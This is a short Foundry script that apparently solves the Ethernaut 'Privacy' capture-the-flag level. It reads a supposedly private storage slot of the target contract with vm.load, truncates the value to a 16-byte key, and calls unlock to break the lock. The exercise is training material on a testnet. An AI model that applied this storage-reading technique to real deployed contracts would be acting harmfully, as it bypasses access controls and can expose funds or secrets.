// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {Privacy} from "src/levels/Privacy.sol";

contract PrivacyScript is Script {
    function run() external {
        address privacyAddress = vm.envAddress("PRIVACY_ADDRESS");

        // Load Privacy contract instance using interface
        Privacy privacy = Privacy(privacyAddress);

        // Get private key from .env file
        uint256 attackerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");

        // Set attacker as the msg.sender for all subsequent transactions.
        vm.startBroadcast(attackerKey);

        console2.log("Reading private data...");
        bytes32 data = vm.load(address(privacy), bytes32(uint256(5)));
        bytes16 key = bytes16(data);

        console2.log("Performing hack...");
        privacy.unlock(key);

        console2.log("'top' set to : ", privacy.locked());

        vm.stopBroadcast();
        console2.log("SUCCESS!!! Submit the instance.");
    }
}
